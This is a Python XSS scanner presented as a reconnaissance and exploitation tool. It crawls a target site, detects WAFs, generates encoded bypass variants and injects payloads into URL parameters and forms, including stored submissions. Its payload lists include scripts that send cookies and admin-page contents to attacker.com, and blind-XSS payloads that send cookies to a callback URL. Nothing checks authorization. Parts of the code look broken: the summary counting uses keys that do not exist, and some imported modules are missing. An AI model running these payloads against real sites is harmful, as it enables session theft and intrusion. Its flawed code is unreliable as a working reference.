#!/usr/bin/env python3
"""
Advanced XSS Scanner - Complete Reconnaissance and Exploitation Tool
Author: AI Assistant
Version: 1.0.0

This tool provides comprehensive XSS testing including:
- Full reconnaissance and target discovery
- Context-aware payload generation
- WAF detection and bypass
- Custom popup system for verification
- Screenshot capture for PoC
- Support for all major XSS types
"""

import requests
import re
import json
import base64
import urllib.parse
import time
import threading
import socket
import hashlib
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import argparse
import logging
from datetime import datetime
import os
import random
import string
from typing import Dict, List, Set, Tuple, Optional
import asyncio
import aiohttp
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
import subprocess
import tempfile
import uuid

# Import our custom modules
from waf_bypass import WAFBypassEngine
from custom_popup import CustomPopupSystem

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('xss_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class XSSPayloads:
    """Comprehensive XSS payload collection with context awareness"""
    
    def __init__(self):
        self.payloads = {
            'basic': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
            ],
            
            'waf_bypass': [
                '<ScRiPt>alert("XSS")</ScRiPt>',
                '<script>al\u0065rt("XSS")</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
                '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
                '<svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
                '<script>alert`XSS`</script>',
                '<script>alert(/XSS/)</script>',
                '<script>alert(1)</script>',
                '<script>confirm(1)</script>',
                '<script>prompt(1)</script>',
            ],
            
            'context_specific': {
                'html': [
                    '<script>alert("XSS")</script>',
                    '<img src=x onerror=alert("XSS")>',
                    '<svg onload=alert("XSS")>',
                    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                ],
                'attribute': [
                    '"onmouseover="alert(\'XSS\')"',
                    '"><script>alert("XSS")</script>',
                    "'><script>alert('XSS')</script>",
                    '"onfocus="alert(\'XSS\')" autofocus="',
                    '"><img src=x onerror=alert("XSS")>',
                ],
                'javascript': [
                    ';alert("XSS");//',
                    '\';alert("XSS");//',
                    '";alert("XSS");//',
                    '`;alert("XSS");//',
                    '\\\';alert("XSS");//',
                ],
                'css': [
                    'expression(alert("XSS"))',
                    'url("javascript:alert(\'XSS\')")',
                    '@import "javascript:alert(\'XSS\')"',
                ],
                'url': [
                    'javascript:alert("XSS")',
                    'data:text/html,<script>alert("XSS")</script>',
                    'vbscript:alert("XSS")',
                ]
            },
            
            'advanced': [
                '<script>fetch("/admin").then(r=>r.text()).then(d=>fetch("//attacker.com/steal?data="+btoa(d)))</script>',
                '<script>document.location="//attacker.com/steal?cookie="+document.cookie</script>',
                '<script>new Image().src="//attacker.com/steal?data="+document.cookie</script>',
                '<script>XMLHttpRequest.prototype.open=function(){alert("XSS")}</script>',
                '<script>Object.prototype.toString=function(){alert("XSS")}</script>',
            ],
            
            'custom_popup': [
                '<script>window.open("data:text/html,<h1>XSS Confirmed!</h1><p>Target: "+window.location+"</p><p>Time: "+new Date()+"</p>","XSSPoC","width=600,height=400")</script>',
                '<script>var popup=document.createElement("div");popup.innerHTML="<h1>XSS Confirmed!</h1><p>Target: "+window.location+"</p>";popup.style.cssText="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:red;color:white;padding:20px;z-index:9999;border:2px solid black;";document.body.appendChild(popup);</script>',
            ]
        }
        
        self.encodings = [
            'url',
            'html_entities',
            'unicode',
            'base64',
            'hex',
            'double_url',
            'mixed'
        ]

    def get_payloads_by_context(self, context: str) -> List[str]:
        """Get payloads based on injection context"""
        if context in self.payloads['context_specific']:
            return self.payloads['context_specific'][context]
        return self.payloads['basic']

    def encode_payload(self, payload: str, encoding: str) -> str:
        """Apply encoding to payload for WAF bypass"""
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'html_entities':
            return ''.join(f'&#{ord(c)};' for c in payload)
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'hex':
            return ''.join(f'%{ord(c):02x}' for c in payload)
        elif encoding == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == 'mixed':
            # Mix different encodings
            encoded = payload
            for i, char in enumerate(payload):
                if i % 3 == 0:
                    encoded = encoded.replace(char, f'&#{ord(char)};', 1)
                elif i % 3 == 1:
                    encoded = encoded.replace(char, urllib.parse.quote(char), 1)
            return encoded
        return payload

    def generate_variants(self, payload: str) -> List[str]:
        """Generate payload variants with different encodings"""
        variants = [payload]
        for encoding in self.encodings:
            variants.append(self.encode_payload(payload, encoding))
        return variants


class WAFDetector:
    """WAF Detection and Analysis"""
    
    def __init__(self):
        self.waf_signatures = {
            'cloudflare': [
                'cf-ray',
                'cf-cache-status',
                'cloudflare',
                'cf-bgj',
                'cf-request-id'
            ],
            'incapsula': [
                'incap_ses',
                'visid_incap',
                'incapsula'
            ],
            'akamai': [
                'akamai',
                'ak-bmsc'
            ],
            'aws_waf': [
                'x-amz-cf-id',
                'aws-waf'
            ],
            'barracuda': [
                'barracuda',
                'barra'
            ],
            'f5': [
                'f5',
                'bigip'
            ],
            'imperva': [
                'imperva',
                'x-iinfo'
            ],
            'sucuri': [
                'sucuri',
                'x-sucuri-id'
            ]
        }
        
        self.waf_indicators = [
            'blocked',
            'forbidden',
            'access denied',
            'security',
            'waf',
            'firewall',
            'protection',
            'mod_security'
        ]

    def detect_waf(self, response: requests.Response) -> Dict[str, bool]:
        """Detect WAF presence from response"""
        waf_detected = {}
        
        # Check headers
        for waf_name, signatures in self.waf_signatures.items():
            waf_detected[waf_name] = any(
                sig.lower() in str(response.headers).lower() 
                for sig in signatures
            )
        
        # Check response content for WAF indicators
        content_lower = response.text.lower()
        for indicator in self.waf_indicators:
            if indicator in content_lower:
                waf_detected['generic'] = True
                break
        
        # Check response codes
        if response.status_code in [403, 406, 429]:
            waf_detected['blocking'] = True
            
        return waf_detected

    def get_bypass_techniques(self, waf_type: str) -> List[str]:
        """Get WAF bypass techniques based on detected WAF"""
        bypass_techniques = {
            'cloudflare': [
                'case_variation',
                'unicode_encoding',
                'comment_injection',
                'parameter_pollution'
            ],
            'incapsula': [
                'double_encoding',
                'null_bytes',
                'chunked_encoding'
            ],
            'akamai': [
                'header_injection',
                'parameter_fragmentation'
            ],
            'generic': [
                'encoding_variations',
                'case_manipulation',
                'comment_bypass'
            ]
        }
        
        return bypass_techniques.get(waf_type, bypass_techniques['generic'])


class ReconnaissanceEngine:
    """Advanced reconnaissance and target discovery"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.discovered_params = set()
        self.discovered_forms = []
        self.discovered_urls = set()

    def discover_parameters(self, url: str) -> Set[str]:
        """Discover URL parameters through various methods"""
        params = set()
        
        try:
            # Parse existing parameters
            parsed_url = urlparse(url)
            existing_params = parse_qs(parsed_url.query).keys()
            params.update(existing_params)
            
            # Common parameter names
            common_params = [
                'q', 'query', 'search', 'id', 'page', 'user', 'name',
                'email', 'username', 'password', 'token', 'key', 'value',
                'data', 'input', 'text', 'content', 'message', 'comment',
                'title', 'subject', 'body', 'description', 'url', 'link',
                'redirect', 'return', 'callback', 'success', 'error',
                'debug', 'test', 'admin', 'config', 'setting'
            ]
            
            # Add common parameters if not present
            for param in common_params:
                if param not in params:
                    params.add(param)
                    
        except Exception as e:
            logger.error(f"Error discovering parameters: {e}")
            
        return params

    def discover_forms(self, html_content: str, base_url: str) -> List[Dict]:
        """Discover forms and input fields"""
        forms = []
        
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                # Make action URL absolute
                if form_data['action']:
                    form_data['action'] = urljoin(base_url, form_data['action'])
                else:
                    form_data['action'] = base_url
                
                # Discover input fields
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', ''),
                        'placeholder': input_tag.get('placeholder', ''),
                        'id': input_tag.get('id', ''),
                        'class': input_tag.get('class', [])
                    }
                    form_data['inputs'].append(input_data)
                
                forms.append(form_data)
                
        except Exception as e:
            logger.error(f"Error discovering forms: {e}")
            
        return forms

    def crawl_urls(self, base_url: str, max_depth: int = 2) -> Set[str]:
        """Crawl website to discover additional URLs"""
        urls = {base_url}
        visited = set()
        to_visit = [(base_url, 0)]
        
        while to_visit and len(visited) < 50:  # Limit crawling
            current_url, depth = to_visit.pop(0)
            
            if current_url in visited or depth > max_depth:
                continue
                
            visited.add(current_url)
            
            try:
                response = self.session.get(current_url, timeout=10)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        absolute_url = urljoin(current_url, href)
                        
                        # Only crawl same domain
                        if urlparse(absolute_url).netloc == urlparse(base_url).netloc:
                            if absolute_url not in urls:
                                urls.add(absolute_url)
                                to_visit.append((absolute_url, depth + 1))
                                
            except Exception as e:
                logger.error(f"Error crawling {current_url}: {e}")
                
        return urls

    def analyze_response(self, response: requests.Response) -> Dict:
        """Analyze response for potential injection points"""
        analysis = {
            'reflection_points': [],
            'context_info': {},
            'headers': dict(response.headers),
            'status_code': response.status_code
        }
        
        content = response.text
        
        # Look for reflection patterns
        reflection_patterns = [
            r'<[^>]*>([^<]*)</[^>]*>',  # HTML tags
            r'"([^"]*)"',               # Double quotes
            r"'([^']*)'",               # Single quotes
            r'`([^`]*)`',               # Backticks
            r'(\w+)=',                  # Attributes
        ]
        
        for pattern in reflection_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            analysis['reflection_points'].extend(matches)
            
        return analysis


class XSSScanner:
    """Main XSS Scanner Class"""
    
    def __init__(self, target_url: str, options: Dict = None):
        self.target_url = target_url
        self.options = options or {}
        self.payloads = XSSPayloads()
        self.waf_detector = WAFBypassEngine()  # Use enhanced WAF bypass engine
        self.recon = ReconnaissanceEngine()
        self.popup_system = CustomPopupSystem()  # Use custom popup system
        self.results = []
        
        # Setup browser for DOM XSS testing
        self.browser = None
        self.setup_browser()

    def setup_browser(self):
        """Setup browser for DOM XSS testing"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            
            self.browser = webdriver.Chrome(options=chrome_options)
            self.browser.set_page_load_timeout(30)
            
        except Exception as e:
            logger.warning(f"Browser setup failed: {e}. DOM XSS testing will be limited.")

    def run_reconnaissance(self) -> Dict:
        """Run comprehensive reconnaissance"""
        logger.info("Starting reconnaissance phase...")
        
        recon_results = {
            'target_url': self.target_url,
            'discovered_params': set(),
            'discovered_forms': [],
            'discovered_urls': set(),
            'waf_detected': {},
            'response_analysis': {}
        }
        
        try:
            # Initial request
            response = self.recon.session.get(self.target_url, timeout=15)
            recon_results['waf_detected'] = self.waf_detector.detect_waf(response)
            recon_results['response_analysis'] = self.recon.analyze_response(response)
            
            # Discover parameters
            recon_results['discovered_params'] = self.recon.discover_parameters(self.target_url)
            
            # Discover forms
            recon_results['discovered_forms'] = self.recon.discover_forms(
                response.text, self.target_url
            )
            
            # Crawl for additional URLs
            if self.options.get('crawl', True):
                recon_results['discovered_urls'] = self.recon.crawl_urls(self.target_url)
            
            logger.info(f"Reconnaissance completed. Found {len(recon_results['discovered_params'])} parameters, "
                       f"{len(recon_results['discovered_forms'])} forms, "
                       f"{len(recon_results['discovered_urls'])} URLs")
            
        except Exception as e:
            logger.error(f"Reconnaissance failed: {e}")
            
        return recon_results

    def test_reflected_xss(self, recon_data: Dict) -> List[Dict]:
        """Test for Reflected XSS vulnerabilities with WAF bypass"""
        logger.info("Testing Reflected XSS...")
        results = []
        
        # Get WAF profile first
        waf_profile = self.waf_detector.create_waf_profile(self.target_url)
        
        for param in recon_data['discovered_params']:
            # Test basic payloads first
            for payload in self.payloads.payloads['basic']:
                try:
                    # Test URL parameters
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    response = self.recon.session.get(test_url, timeout=10)
                    
                    if self.detect_xss_in_response(response, payload):
                        result = {
                            'type': 'Reflected XSS',
                            'parameter': param,
                            'payload': payload,
                            'url': test_url,
                            'method': 'GET',
                            'response_code': response.status_code,
                            'waf_bypassed': False
                        }
                        results.append(result)
                        logger.info(f"Reflected XSS found in parameter: {param}")
                        
                except Exception as e:
                    logger.error(f"Error testing parameter {param}: {e}")
            
            # If WAF detected, try bypass techniques
            if waf_profile['waf_detected']:
                logger.info(f"WAF detected: {waf_profile['waf_type']}. Attempting bypass...")
                
                for payload in self.payloads.payloads['basic']:
                    # Generate bypass payloads
                    bypass_payloads = self.waf_detector.generate_bypass_payloads(payload, waf_profile)
                    
                    for bypass_payload in bypass_payloads:
                        try:
                            test_url = f"{self.target_url}?{param}={urllib.parse.quote(bypass_payload)}"
                            response = self.recon.session.get(test_url, timeout=10)
                            
                            if self.detect_xss_in_response(response, bypass_payload):
                                result = {
                                    'type': 'Reflected XSS (WAF Bypassed)',
                                    'parameter': param,
                                    'payload': bypass_payload,
                                    'original_payload': payload,
                                    'url': test_url,
                                    'method': 'GET',
                                    'response_code': response.status_code,
                                    'waf_bypassed': True,
                                    'waf_type': waf_profile['waf_type']
                                }
                                results.append(result)
                                logger.info(f"WAF bypassed! Reflected XSS found in parameter: {param}")
                                break  # Found working bypass, move to next parameter
                                
                        except Exception as e:
                            logger.error(f"Error testing bypass payload: {e}")
        
        return results

    def test_stored_xss(self, recon_data: Dict) -> List[Dict]:
        """Test for Stored XSS vulnerabilities with custom popup verification"""
        logger.info("Testing Stored XSS...")
        results = []
        
        for form in recon_data['discovered_forms']:
            for input_field in form['inputs']:
                if input_field['name'] and input_field['type'] in ['text', 'textarea', 'email', 'search']:
                    # Use custom popup payload
                    popup_payloads = self.popup_system.generate_popup_payload()
                    
                    for payload in popup_payloads[:3]:  # Test first 3 variants
                        try:
                            # Prepare form data
                            form_data = {}
                            for field in form['inputs']:
                                if field['name']:
                                    if field['name'] == input_field['name']:
                                        form_data[field['name']] = payload
                                    else:
                                        form_data[field['name']] = field['value'] or 'test'
                            
                            # Submit form
                            if form['method'] == 'POST':
                                response = self.recon.session.post(
                                    form['action'], 
                                    data=form_data, 
                                    timeout=15
                                )
                            else:
                                response = self.recon.session.get(
                                    form['action'], 
                                    params=form_data, 
                                    timeout=15
                                )
                            
                            # Check if payload was stored
                            time.sleep(2)  # Wait for storage
                            check_response = self.recon.session.get(form['action'], timeout=10)
                            
                            if self.detect_xss_in_response(check_response, payload):
                                result = {
                                    'type': 'Stored XSS',
                                    'form_action': form['action'],
                                    'parameter': input_field['name'],
                                    'payload': payload,
                                    'method': form['method'],
                                    'response_code': response.status_code,
                                    'verification_method': 'custom_popup'
                                }
                                
                                # Generate screenshot if browser available
                                if self.browser:
                                    screenshot_path = self.generate_poc_screenshot(result)
                                    if screenshot_path:
                                        result['poc_screenshot'] = screenshot_path
                                
                                results.append(result)
                                logger.info(f"Stored XSS found in form field: {input_field['name']}")
                                
                        except Exception as e:
                            logger.error(f"Error testing form field {input_field['name']}: {e}")
        
        return results

    def test_dom_xss(self, recon_data: Dict) -> List[Dict]:
        """Test for DOM-based XSS vulnerabilities"""
        logger.info("Testing DOM-based XSS...")
        results = []
        
        if not self.browser:
            logger.warning("Browser not available for DOM XSS testing")
            return results
        
        dom_payloads = [
            '#<script>alert("DOM_XSS")</script>',
            '#<img src=x onerror=alert("DOM_XSS")>',
            '#javascript:alert("DOM_XSS")',
            '#<svg onload=alert("DOM_XSS")>',
            '#<iframe src="javascript:alert(\'DOM_XSS\')"></iframe>'
        ]
        
        for url in recon_data['discovered_urls']:
            for payload in dom_payloads:
                try:
                    test_url = f"{url}{payload}"
                    self.browser.get(test_url)
                    
                    # Wait for potential DOM manipulation
                    time.sleep(3)
                    
                    # Check for alert or XSS indicators
                    page_source = self.browser.page_source
                    if 'DOM_XSS' in page_source or self.check_for_alert():
                        result = {
                            'type': 'DOM-based XSS',
                            'url': test_url,
                            'payload': payload,
                            'page_source_length': len(page_source)
                        }
                        results.append(result)
                        logger.info(f"DOM XSS found at: {url}")
                        
                except Exception as e:
                    logger.error(f"Error testing DOM XSS at {url}: {e}")
        
        return results

    def test_blind_xss(self, recon_data: Dict) -> List[Dict]:
        """Test for Blind XSS vulnerabilities"""
        logger.info("Testing Blind XSS...")
        results = []
        
        # Setup callback server (simplified - in real implementation, use ngrok or similar)
        callback_url = self.options.get('callback_url', 'http://localhost:8080/callback')
        
        blind_payloads = [
            f'<script>fetch("{callback_url}?data="+btoa(document.cookie))</script>',
            f'<img src="{callback_url}?data="+document.cookie>',
            f'<script>new Image().src="{callback_url}?data="+btoa(document.location)</script>'
        ]
        
        for form in recon_data['discovered_forms']:
            for input_field in form['inputs']:
                if input_field['name'] and input_field['type'] in ['text', 'textarea', 'email', 'search']:
                    for payload in blind_payloads:
                        try:
                            # Prepare form data
                            form_data = {}
                            for field in form['inputs']:
                                if field['name']:
                                    if field['name'] == input_field['name']:
                                        form_data[field['name']] = payload
                                    else:
                                        form_data[field['name']] = field['value'] or 'test'
                            
                            # Submit form
                            if form['method'] == 'POST':
                                response = self.recon.session.post(
                                    form['action'], 
                                    data=form_data, 
                                    timeout=15
                                )
                            else:
                                response = self.recon.session.get(
                                    form['action'], 
                                    params=form_data, 
                                    timeout=15
                                )
                            
                            # Note: In real implementation, you'd monitor callback server
                            # For now, we'll just log the attempt
                            logger.info(f"Blind XSS payload submitted to {input_field['name']}")
                            
                        except Exception as e:
                            logger.error(f"Error testing blind XSS: {e}")
        
        return results

    def detect_xss_in_response(self, response: requests.Response, payload: str) -> bool:
        """Detect if XSS payload was reflected in response"""
        content = response.text.lower()
        payload_lower = payload.lower()
        
        # Check for direct reflection
        if payload_lower in content:
            return True
        
        # Check for encoded reflection
        encoded_payloads = [
            urllib.parse.quote(payload),
            ''.join(f'&#{ord(c)};' for c in payload),
            base64.b64encode(payload.encode()).decode()
        ]
        
        for encoded in encoded_payloads:
            if encoded.lower() in content:
                return True
        
        return False

    def check_for_alert(self) -> bool:
        """Check if browser alert was triggered"""
        try:
            alert = self.browser.switch_to.alert
            alert.accept()
            return True
        except:
            return False

    def generate_poc_screenshot(self, result: Dict) -> str:
        """Generate screenshot for PoC"""
        if not self.browser:
            return None
        
        try:
            # Navigate to vulnerable URL
            self.browser.get(result['url'])
            time.sleep(3)
            
            # Take screenshot
            screenshot_path = f"/tmp/xss_poc_{int(time.time())}.png"
            self.browser.save_screenshot(screenshot_path)
            
            return screenshot_path
            
        except Exception as e:
            logger.error(f"Error generating screenshot: {e}")
            return None

    def run_scan(self) -> Dict:
        """Run complete XSS scan"""
        logger.info(f"Starting XSS scan for: {self.target_url}")
        
        scan_results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'reconnaissance': {},
            'vulnerabilities': [],
            'summary': {
                'total_vulnerabilities': 0,
                'reflected_xss': 0,
                'stored_xss': 0,
                'dom_xss': 0,
                'blind_xss': 0
            }
        }
        
        try:
            # Phase 1: Reconnaissance
            scan_results['reconnaissance'] = self.run_reconnaissance()
            
            # Phase 2: Vulnerability Testing
            scan_results['vulnerabilities'].extend(self.test_reflected_xss(scan_results['reconnaissance']))
            scan_results['vulnerabilities'].extend(self.test_stored_xss(scan_results['reconnaissance']))
            scan_results['vulnerabilities'].extend(self.test_dom_xss(scan_results['reconnaissance']))
            scan_results['vulnerabilities'].extend(self.test_blind_xss(scan_results['reconnaissance']))
            
            # Phase 3: Generate PoCs
            for vuln in scan_results['vulnerabilities']:
                screenshot = self.generate_poc_screenshot(vuln)
                if screenshot:
                    vuln['poc_screenshot'] = screenshot
            
            # Update summary
            scan_results['summary']['total_vulnerabilities'] = len(scan_results['vulnerabilities'])
            for vuln in scan_results['vulnerabilities']:
                scan_results['summary'][f"{vuln['type'].lower().replace(' ', '_').replace('-', '_')}_xss"] += 1
            
            logger.info(f"Scan completed. Found {scan_results['summary']['total_vulnerabilities']} vulnerabilities")
            
        except Exception as e:
            logger.error(f"Scan failed: {e}")
            scan_results['error'] = str(e)
        
        finally:
            if self.browser:
                self.browser.quit()
        
        return scan_results

    def save_report(self, results: Dict, output_file: str = None):
        """Save scan results to file"""
        if not output_file:
            output_file = f"xss_scan_report_{int(time.time())}.json"
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Report saved to: {output_file}")
            
        except Exception as e:
            logger.error(f"Error saving report: {e}")


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner')
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('-o', '--output', help='Output file for report')
    parser.add_argument('--no-crawl', action='store_true', help='Disable URL crawling')
    parser.add_argument('--callback-url', help='Callback URL for blind XSS testing')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Initialize scanner
    options = {
        'crawl': not args.no_crawl,
        'callback_url': args.callback_url
    }
    
    scanner = XSSScanner(args.target, options)
    
    # Run scan
    results = scanner.run_scan()
    
    # Save report
    scanner.save_report(results, args.output)
    
    # Print summary
    print(f"\n=== XSS Scan Summary ===")
    print(f"Target: {results['target']}")
    print(f"Total Vulnerabilities: {results['summary']['total_vulnerabilities']}")
    print(f"Reflected XSS: {results['summary']['reflected_xss']}")
    print(f"Stored XSS: {results['summary']['stored_xss']}")
    print(f"DOM XSS: {results['summary']['dom_xss']}")
    print(f"Blind XSS: {results['summary']['blind_xss']}")
    
    if results['vulnerabilities']:
        print(f"\n=== Vulnerabilities Found ===")
        for i, vuln in enumerate(results['vulnerabilities'], 1):
            print(f"{i}. {vuln['type']} - {vuln.get('parameter', vuln.get('url', 'Unknown'))}")


if __name__ == '__main__':
    main()